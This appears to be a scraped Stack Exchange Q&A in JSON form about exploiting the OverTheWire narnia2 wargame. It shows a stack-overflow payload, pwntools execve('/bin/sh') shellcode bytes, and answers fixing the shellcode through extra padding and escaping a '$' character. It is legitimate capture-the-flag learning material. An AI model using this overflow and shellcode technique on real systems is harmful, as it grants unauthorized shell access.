@@ -1,0 +1,46 @@
+{
+  "title": "pwntools shellcode narnia2",
+  "link": "https://reverseengineering.stackexchange.com/questions/20194/pwntools-shellcode-narnia2",
+  "content": "I'm trying to solve the narnia2 challenge on overthewire. \n\nI read a guide for help and managed to overwrite the stack with A's using some python\n\n$(python -c \"print 'A'*132 + '\\xef\\xbe\\xad\\xde'\")\n\nand that works fine. I get a seg fault, and can use gdb to see eip has been overwritten with 0xdeadbeef - great so now I assumed the stack size is 132 bytes and then the next 4 overwrite eip to redirect the return. \n\n( a lot of guides say to use 144 here - but I'm assuming the challenge changed? ) \n\nI used pwntools to generate me shellcode for a shell ( the same way I solves the previous challenge ) - and got \n\n\n -> asm(shellcraft.i386.linux.sh())\n'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80'\n\n\nThis payload worked on the previous challenge, but now when I go through the process of sticking this shellcode in my payload it never works. Replacing this with a shellcode from a guide works fine \n\nasm(shellcraft.i386.linux.sh())\n'h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xd2Rj\\x04Z\\x01\\xe2R\\x89\\xe2jhh///sh/binj\\x0bX\\x89\\xe3\\x89\\xd1\\x99\\xcd\\x80'\n\n\nIt looks the same but with some extra stuff at the start. Why is this and how is it produced?\n\n",
+  "votes": "1",
+  "answers": 2,
+  "views": "1k",
+  "tags": [
+    "binary-analysis",
+    "gdb",
+    "pwntools"
+  ],
+  "user": "CWright",
+  "time": "Dec 25, 2018 at 14:12",
+  "comments": [
+    {
+      "user": "p1xel",
+      "text": "The \"shellcode from a guide\" is different than the pwntools' shellcode (look at the third-last byte).",
+      "time": null
+    }
+  ],
+  "answers_data": [
+    {
+      "content": "This is a relatively old question, but I recently stumbled across the same problem myself. In the interest of the greater good, I will explain what is going on.\n\nIt is likely that the structure of your payload (the entire sequence of bytes you send to the process) is something like this:\n\n```\nPADDING + SHELLCODE + RETURN_ADDRESS\n\n```\nSadly, this does not work well with pwntools' shellcode. The reason is that the push instructions modify the stack, where your shellcode is. This means that the shellcode is (unintentionally) mutated to something else, and of course shenanigans ensue.\n\nThe solution is to add some padding after the shellcode. Because the stack grows to lesser addresses, push instructions will first overwrite the data in the greater address locations.\n\n```\nPADDING + SHELLCODE + **MORE_PADDING** + RETURN_ADDRESS\n\n```\nFor me, MORE_PADDING of 32 bytes worked nicely. Do not forget to reduce the size of the original PADDING appropriately so that the return address is correctly overwritten.\n\n",
+      "votes": "2",
+      "user": "p1xel",
+      "time": "Aug 20, 2020 at 10:22",
+      "is_accepted": false,
+      "comments": []
+    },
+    {
+      "content": "When encountering such issue, you should keep debugging. After breaking on the payload you can notice GDB is showing these instructions (as Intel flavor disassembly):\n\n```\npush   0x68\npush   0x732f2f2f\npush   0x6e69622f\nmov    ebx,esp\npush   0x1010101\nxor    DWORD PTR [ecx+eax*1],0x51c93101\npush   0x4\n\n```\nThis XOR instruction is suspicious since it is using eax and ecx while they've not been initiliazed by our shellcode. I checked against what pwnlib instructions suggest for this shellcode:\n\n```\nshellcraft.i386.linux.sh()\n/* ... */\nxor dword ptr [esp], 0x1016972\n/* ... */\n\n```\nThen, you're still getting a SEGFAULT because the instruction is wrong, and dereferencing some incorrect values.\n\nAlso the second shellcode you're providing can be retrieved with shellcraft.execve('/bin/sh').\n\nEDIT \n\nThe issue is not from pwntools but must be linked to the way the payload is used. The bad instruction identified above contains a '$' character which is then (if you still use your $(python -c '...') input) interpreted by the subshell invoked as the variable name '$ri'.\n\nThis variable is likely not defined in your shell which in turn makes these 3 characters to be deleted from the input given to the program, hence, modifying operands of this instruction and the instruction following it.\n\nIn order to make it right, you may sanitize the input by bringing whatever is required. For example :\n\n```\nasm(shellcraft.i386.linux.sh()).replace('$','\\$')\n\n```\nI suppose it is the issue you got, but can't be sure without more information.\n\n",
+      "votes": "0",
+      "user": "Leath",
+      "time": "Dec 26, 2018 at 18:18",
+      "is_accepted": false,
+      "comments": [
+        {
+          "user": "CWright",
+          "text": "So that means the payload created by pwnlib is incorrect and using values it hasn't yet initialised?",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
